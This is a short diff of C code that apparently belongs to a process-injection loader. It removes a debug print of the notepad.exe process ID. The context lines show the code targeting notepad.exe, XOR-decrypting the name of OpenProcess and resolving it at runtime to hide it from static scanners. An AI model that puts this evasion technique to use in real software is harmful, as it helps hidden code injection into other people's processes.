@@ -149,8 +149,6 @@ int main(void) {
     pid = FindTarget("notepad.exe");
 
     if (pid) {
-        printf("Notepad.exe PID = %d\n", pid);
-
         // decrypt OpenProcess function call
         XOR((char *) s_op, s_op_len, f_key, sizeof(f_key));
         pOpenProcess = GetProcAddress(GetModuleHandle("kernel32.dll"), s_op);
